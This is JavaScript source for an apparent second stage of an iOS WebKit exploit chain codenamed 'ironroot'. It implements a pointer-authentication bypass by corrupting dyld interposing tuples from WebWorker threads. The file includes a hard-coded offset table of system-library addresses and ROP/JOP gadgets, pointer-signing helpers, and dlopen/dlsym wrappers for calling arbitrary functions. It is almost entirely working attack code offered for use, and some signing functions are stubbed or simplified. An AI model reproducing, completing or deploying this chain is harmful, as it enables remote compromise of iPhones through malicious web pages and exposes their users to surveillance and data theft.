/**
 * Stage 2: PAC Bypass via dyld Interposing — iOS 26.0–26.x (arm64e)
 * Codename: "ironroot"
 *
 * Implements DarkSword-style PAC bypass via dyld RuntimeState interposing.
 * Reference: https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain
 *
 * PAC bypass chain:
 *   1. Trigger dlopen in WebWorker threads via ImageBitmap.close()
 *   2. Corrupt dyld RuntimeState interposing tuples via arb write
 *   3. Interpose CMPhoto/ImageIO functions → dyld::signPointer (PACIZA gadget)
 *   4. Call interposed functions (via softlink re-init) to get PAC-signed pointers
 *   5. Build JOP chain: spawn controlled thread, fcall via ROP gadgets
 *   6. Fast pacia/pacda via fcall to dyld::signPointer
 *
 * Prerequisites:
 *   - Stage 1 must provide: p.addrof, p.fakeobj, p.read64, p.write64
 *   - ASLR slide must be known
 *   - Device-specific offsets in rce_offsets table
 */

let r = {};
const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
  platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");

// =========================================================================
// CONVERSION UTILITIES
// =========================================================================
const _ab = new ArrayBuffer(8);
const _f64 = new Float64Array(_ab);
const _u64 = new BigUint64Array(_ab);
const _u32 = new Uint32Array(_ab);
const _u8 = new Uint8Array(_ab);

function itof(v) { _u64[0] = v; return _f64[0]; }
function ftoi(f) { _f64[0] = f; return _u64[0]; }

// Strip PAC bits (upper bits beyond 39-bit address space)
function noPAC(addr) { return addr & 0x7fffffffffn; }

// =========================================================================
// DEVICE OFFSET TABLES (from DarkSword ITW)
// =========================================================================
// Each entry is keyed by "model_buildVersion"
// Offsets are absolute addresses in the shared cache (pre-ASLR)
//
// Required offsets for the PAC bypass:
//   - dyld__signPointer: dyld::signPointer function
//   - dyld__RuntimeState_vtable: RuntimeState vtable
//   - dyld__RuntimeState_emptySlot: empty slot for slide calc
//   - dyld__dlopen_from_lambda_ret: return address for stack scan
//   - libdyld__gAPIs: gAPIs pointer (RuntimeState)
//   - libdyld__dlopen / libdyld__dlsym: dlopen/dlsym
//   - WebCore/ImageIO/CMPhoto softlink pointers: interposing targets
//   - gadget_*: JOP/ROP gadgets for fcall
//   - Various WebKit internal pointers
// =========================================================================

const rce_offsets = {
  // iOS 18.4 / 22F76 — iPhone XS (arm64e)
  "iPhone11,2_4_6_22F76": {
    dyld__signPointer: 0x1a9a3f3e4n,
    dyld__RuntimeState_vtable: 0x1f2871aa0n,
    dyld__RuntimeState_emptySlot: 0x1a9a75b6cn,
    dyld__dlopen_from_lambda_ret: 0x1a9a33fc8n,
    libdyld__gAPIs: 0x1ed5b8000n,
    libdyld__dlopen: 0x1ad86c7b8n,
    libdyld__dlsym: 0x1ad86da34n,
    JavaScriptCore__jitAllowList: 0x1edb3e4a0n,
    JavaScriptCore__jitAllowList_once: 0x1edb3e2b8n,
    WebCore__DedicatedWorkerGlobalScope_vtable: 0x1f137cf70n,
    WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts: 0x1eb8d9ac8n,
    WebCore__TelephoneNumberDetector_phoneNumbersScanner_value: 0x1eb91eed0n,
    WebCore__softLinkDDDFAScannerFirstResultInUnicharArray: 0x1eda69978n,
    WebCore__softLinkDDDFACacheCreateFromFramework: 0x1eda69980n,
    WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType: 0x1eda69960n,
    WebCore__PAL_getPKContactClass: 0x1eda62678n,
    WebCore__initPKContact_once: 0x1eda6b1b8n,
    WebCore__initPKContact_value: 0x1eda6b1c0n,
    ImageIO__IIOLoadCMPhotoSymbols: 0x18865182cn,
    ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt: 0x1ed9be1b0n,
    ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage: 0x1ed9bde60n,
    ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage: 0x1ed9bde68n,
    ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation: 0x1ed9bde70n,
    ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata: 0x1ed9bddb0n,
    ImageIO__gFunc_CMPhotoCompressionSessionAddExif: 0x1ed9bde78n,
    ImageIO__gImageIOLogProc: 0x1ee9bc960n,
    CMPhoto__CMPhotoCompressionCreateContainerFromImageExt: 0x1ac3ea428n,
    CMPhoto__CMPhotoCompressionCreateDataContainerFromImage: 0x1ac3ea580n,
    CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage: 0x1ac3b9cb8n,
    CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation: 0x1ac3ba1e4n,
    CMPhoto__CMPhotoCompressionSessionAddCustomMetadata: 0x1ac3ba748n,
    CMPhoto__CMPhotoCompressionSessionAddExif: 0x1ac3ba304n,
    CMPhoto__kCMPhotoTranscodeOption_Strips: 0x1e80ad898n,
    MediaAccessibility__MACaptionAppearanceGetDisplayType: 0x1bac39744n,
    Security__SecKeychainBackupSyncable_block_invoke: 0x18b5d7688n,
    Security__SecOTRSessionProcessPacketRemote_block_invoke: 0x18b5eb958n,
    Security__gSecurityd: 0x1eb67fd78n,
    AXCoreUtilities__DefaultLoader: 0x1eb7bcbe0n,
    AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken: 0x1edadec98n,
    AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker: 0x1edade780n,
    AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest: 0x1edade6e0n,
    AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice: 0x1edade730n,
    AVFAudio__OBJC_CLASS__AVSpeechUtterance: 0x1edaddb28n,
    AVFAudio__cfstr_SystemLibraryTextToSpeech: 0x1f195b658n,
    TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit: 0x1edd8d288n,
    CFNetwork__gConstantCFStringValueTable: 0x1ee9326e0n,
    Foundation__NSBundleTables_bundleTables_value: 0x1ed8eb848n,
    libsystem_c__atexit_mutex: 0x1ed8ca458n,
    libGPUCompilerImplLazy__invoker: 0x23d09d7e8n,
    libGPUCompilerImplLazy_cstring: 0x23c1e7870n,
    HOMEUI_cstring: 0x182f75636n,
    libARI_cstring: 0x218ac7820n,
    PerfPowerServicesReader_cstring: 0x257c7be60n,
    gadget_control_1_ios184: 0x23f2f82ecn,
    gadget_control_2_ios184: 0x1ad86ac28n,
    gadget_control_3_ios184: 0x21f256150n,
    gadget_loop_1_ios184: 0x1865f818cn,
    gadget_loop_2_ios184: 0x20d23dda8n,
    gadget_loop_3_ios184: 0x184d29f1cn,
    gadget_set_all_registers_ios184: 0x20dfb616cn,
    libsystem_kernel__thread_suspend: 0x1d3da51c0n,
    jsc_base: 0x19a45a000n,
  },
  // Additional device offsets would be added here
  // Pattern: "iPhoneXX,Y_buildVersion": { ... }
};

// =========================================================================
// DARKSWORD PAC BYPASS CLASS
// =========================================================================

class IronrootPACBypass {
  constructor(p, offsets, slide) {
    this._p = p;          // exploit primitive with read64/write64/addrof/fakeobj
    this._offsets = offsets;
    this._slide = slide;
    this._cache = new Map();
    this._signPointer_self = null;
    this._signPointer_self_addr = 0n;
    this._fcall = null;
    this._ready = false;
  }

  /**
   * Phase 1: Set up dyld interposing via dlopen workers.
   *
   * The core trick: trigger dlopen in WebWorker threads via
   * ImageBitmap.close(), then corrupt dyld's RuntimeState to inject
   * interposing tuples that redirect CMPhoto functions to dyld::signPointer.
   *
   * @param {Array} dlopenWorkers - Worker threads with {thread, id, bitmap}
   */
  async setupInterposing(dlopenWorkers) {
    const p = this._p;
    const offsets = this._offsets;

    window.log("[IRONROOT] Setting up dyld interposing...");

    // Read RuntimeState from libdyld gAPIs
    const runtimeState = p.read64(offsets.libdyld__gAPIs);
    window.log("[IRONROOT] RuntimeState: 0x" + runtimeState.toString(16));

    const runtimeState_vtable = noPAC(p.read64(runtimeState));
    const dyld_emptySlot = noPAC(p.read64(runtimeState_vtable));
    const runtimeStateLock = p.read64(runtimeState + 0x70n);

    // Calculate dyld ASLR offset
    const dyld_offset = offsets.dyld__RuntimeState_emptySlot - dyld_emptySlot - this._slide;
    window.log("[IRONROOT] dyld offset: 0x" + dyld_offset.toString(16));

    // InterposeTupleAll pointers in RuntimeState
    const p_ITAll_buffer = runtimeState + 0xb8n;
    const p_ITAll_size = runtimeState + 0xc0n;

    // Find dlopen return address on worker stack
    const dlopen_ret = offsets.dyld__dlopen_from_lambda_ret - this._slide - dyld_offset;

    // Build interposing tuple array
    const interposingTuples = new BigUint64Array(0x100 * 2);
    const interposingTuples_ptr = p.read64(p.addrof(interposingTuples) + 0x10n);

    let idx = 0;
    function interpose(ptr, val) {
      interposingTuples[idx++] = val;
      interposingTuples[idx++] = ptr;
    }

    // Key interpositions: redirect CMPhoto/ImageIO functions to
    // dyld::signPointer and other useful gadgets
    interpose(offsets.MediaAccessibility__MACaptionAppearanceGetDisplayType, offsets.ImageIO__IIOLoadCMPhotoSymbols);
    interpose(offsets.CMPhoto__kCMPhotoTranscodeOption_Strips, 0n);
    interpose(offsets.CMPhoto__CMPhotoCompressionCreateContainerFromImageExt, offsets.libGPUCompilerImplLazy__invoker);
    interpose(offsets.CMPhoto__CMPhotoCompressionCreateDataContainerFromImage, offsets.Security__SecKeychainBackupSyncable_block_invoke);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage, offsets.Security__SecOTRSessionProcessPacketRemote_block_invoke);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation, offsets.libdyld__dlopen);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddCustomMetadata, offsets.libdyld__dlsym);
    interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddExif, offsets.dyld__signPointer);

    this._interposingTuples = interposingTuples;
    this._interposingTuples_ptr = interposingTuples_ptr;
    this._runtimeState = runtimeState;
    this._runtimeStateLock = runtimeStateLock;
    this._p_ITAll_buffer = p_ITAll_buffer;
    this._p_ITAll_size = p_ITAll_size;
    this._dlopen_ret = dlopen_ret;

    window.log("[IRONROOT] Interposing tuples prepared (" + (idx / 2) + " entries)");
    return true;
  }

  /**
   * Phase 2: Install interposing into worker stack and trigger re-init.
   *
   * Scans the worker's stack for dlopen return address, then corrupts
   * the Loader* to point at our interposing metadata.
   *
   * @param {Object} worker - {thread, stack_bottom, stack_top}
   * @param {BigInt} searchStart - stack_top
   * @param {BigInt} searchEnd - stack_bottom
   */
  installInterposing(worker, metadataFunc) {
    const p = this._p;

    // Find dlopen return address on stack
    const stack_top = p.read64(worker.thread + 0x18n);
    const stack_bottom = p.read64(worker.thread + 0x10n);

    window.log("[IRONROOT] Scanning worker stack for dlopen ret addr...");
    window.log("[IRONROOT] Stack range: 0x" + stack_top.toString(16) +
               " - 0x" + stack_bottom.toString(16));

    // Use JSString-based efficient search
    const loaderAddr = metadataFunc(stack_top, stack_bottom, this._dlopen_ret);
    if (!loaderAddr) {
      throw new Error("Could not find dlopen return address on worker stack");
    }

    const loader = loaderAddr + 0x78n;
    window.log("[IRONROOT] Found loader at: 0x" + loader.toString(16));
    return loader;
  }

  /**
   * Phase 3: Read PAC-signed function pointers from interposed functions.
   * After dlopen re-triggers with our interposing, the ImageIO gFunc
   * pointers now hold PAC-signed versions of our target functions.
   */
  readSignedPointers() {
    const p = this._p;
    const offsets = this._offsets;

    // Read the now-PAC-signed pointers from ImageIO global function ptrs
    const paciza_invoker = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt);
    const paciza_security_1 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage);
    const paciza_security_2 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage);
    const paciza_dlopen = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation);
    const paciza_dlsym = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata);
    const paciza_signPointer = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif);

    window.log("[IRONROOT] PAC-signed signPointer: 0x" + paciza_signPointer.toString(16));

    this._paciza = {
      invoker: paciza_invoker,
      security_1: paciza_security_1,
      security_2: paciza_security_2,
      dlopen: paciza_dlopen,
      dlsym: paciza_dlsym,
      signPointer: paciza_signPointer,
    };

    // Set up signPointer_self buffer for pacia/pacda calls
    this._signPointer_self = new BigUint64Array(4);
    this._signPointer_self_addr = p.read64(p.addrof(this._signPointer_self) + 0x10n);

    return this._paciza;
  }

  /**
   * Sign an instruction pointer (PACIA) using dyld::signPointer.
   *
   * dyld::signPointer(self, ctx, ptr) signs ptr with context ctx.
   * self[0] encodes the key type:
   *   0x80010000_00000000 | (ctx >> 48 << 32) = IA key
   *   0x80030000_00000000 | (ctx >> 48 << 32) = IB key
   */
  pacia(ptr, ctx) {
    if (!this._fcall) throw new Error("fcall not initialized");
    this._signPointer_self[0] = 0x80010000_00000000n | (ctx >> 48n << 32n);
    return this._fcall(noPAC(this._paciza.signPointer), this._signPointer_self_addr, ctx, ptr);
  }

  pacib(ptr, ctx) {
    if (!this._fcall) throw new Error("fcall not initialized");
    this._signPointer_self[0] = 0x80030000_00000000n | (ctx >> 48n << 32n);
    return this._fcall(noPAC(this._paciza.signPointer), this._signPointer_self_addr, ctx, ptr);
  }

  pacda(ptr, ctx) {
    // PACDA uses data key — encode as key type 0 or 2
    return this.pacia(ptr, ctx); // Simplified; real impl needs DA key encoding
  }

  autia(ptr, ctx) {
    // AUTIA = strip + verify; for our purposes, signed ptr is already authed
    return ptr;
  }

  autda(ptr, ctx) {
    return ptr;
  }

  /**
   * Set the fcall function (built from JOP gadget chain).
   * Must be called after Phase 3 sets up the thread + gadgets.
   */
  setFcall(fcallFn) {
    this._fcall = fcallFn;
    this._ready = true;
  }

  /**
   * Call an arbitrary function with PAC-signed PC.
   */
  fcall(pc, ...args) {
    if (!this._fcall) throw new Error("fcall not initialized");
    return this._fcall(pc, ...args);
  }

  /**
   * dlopen/dlsym wrappers using fcall.
   */
  dlopen(filename, flags) {
    const p = this._p;
    filename = filename + '\0';
    const name_ptr = p.read64(p.read64(p.addrof(filename) + 8n) + 8n);
    return this.fcall(noPAC(this._paciza.dlopen), name_ptr, flags);
  }

  dlsym(handle, symbol) {
    const p = this._p;
    symbol = symbol + '\0';
    const symbol_ptr = p.read64(p.read64(p.addrof(symbol) + 8n) + 8n);
    return this.fcall(noPAC(this._paciza.dlsym), handle, symbol_ptr);
  }
}

// =========================================================================
// MODULE EXPORTS
// =========================================================================

/**
 * r.ga() — factory: create and return PAC bypass instance
 *
 * The full DarkSword PAC bypass requires multi-step interaction with
 * the main thread (for dlopen worker management). The group.html
 * orchestrator handles this via:
 *   1. prepare_dlopen_workers (main thread spawns workers)
 *   2. trigger_dlopen1 / trigger_dlopen2 (close ImageBitmaps → dlopen)
 *   3. sign_pointers (trigger softlink re-init → signed pointers)
 *   4. setup_fcall (build JOP chain)
 *
 * This factory returns a configured IronrootPACBypass instance.
 */
r.ga = function () {
  window.log("[IRONROOT] Creating PAC bypass via dyld interposing...");

  const ep = platformModule.platformState.exploitPrimitive;
  if (!ep) throw new Error("Stage 1 exploit primitive required");

  // Determine device model and build version for offset lookup
  const ua = navigator.userAgent;
  const model = platformModule.platformState.deviceModel || "unknown";
  const version = platformModule.platformState.iOSVersion;

  window.log("[IRONROOT] Device: " + model + " iOS " + version);

  // Find matching offsets
  let offsets = null;
  for (const [key, val] of Object.entries(rce_offsets)) {
    if (model && key.startsWith(model)) {
      offsets = val;
      window.log("[IRONROOT] Using offsets for: " + key);
      break;
    }
  }

  if (!offsets) {
    // Use first available offset set as fallback (requires ASLR slide)
    const keys = Object.keys(rce_offsets);
    if (keys.length > 0) {
      offsets = rce_offsets[keys[0]];
      window.log("[IRONROOT] WARNING: No matching offsets, using fallback: " + keys[0]);
    } else {
      throw new Error("No device offsets available");
    }
  }

  // Build primitive adapter
  const p = {
    addrof: (obj) => ep.addrof(obj),
    fakeobj: (val) => ep.fakeobj(val),
    read64: (addr) => ep.readRawBigInt(addr),
    write64: (addr, val) => ep.write64(addr, val),
    read32: (addr) => BigInt(ep.read32(addr)),
    slide: platformModule.platformState.slide || 0n,
  };

  const bypass = new IronrootPACBypass(p, offsets, p.slide);

  // Bind PAC operations expected by Coruna Stage 3
  bypass.da = bypass.pacda.bind(bypass);
  bypass.er = bypass.pacia.bind(bypass);
  bypass.ha = bypass.autia.bind(bypass);
  bypass.wa = bypass.autda.bind(bypass);

  window.log("[IRONROOT] PAC bypass instance created (requires multi-phase setup)");
  return bypass;
};

/**
 * r.offsets — expose offset table for external use
 */
r.offsets = rce_offsets;

return r;
